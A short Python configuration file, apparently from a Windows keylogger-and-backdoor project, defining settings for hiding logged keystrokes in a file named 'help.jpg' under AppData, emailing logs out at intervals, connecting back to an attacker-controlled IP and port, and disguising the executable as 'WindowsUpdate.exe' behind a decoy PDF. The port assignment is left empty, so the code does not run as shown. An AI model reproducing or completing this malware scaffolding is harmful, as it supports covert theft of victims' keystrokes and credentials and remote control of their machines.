from datetime import datetime
import os

class Initialize:
    #ForKeylogger
    winName = ''
    keyLst = []
    filepath = os.environ['appdata'] + "\\" + 'help.jpg'
    posstop = filepath.find('.')
    filecopy = filepath[:posstop] + "1.jpg"
    wrt = 512
    keycount = 0
    count = 0
    email = ""
    password = ""
    time = 100 #time between emails

    #For Backdoor
    ip = '' #IP address of host you control here
    port = #Port number here
    frontfile = "\\" + ""  #Name of PDF
    file = "WindowsUpdate.exe"
class Date:
    time = datetime.now()
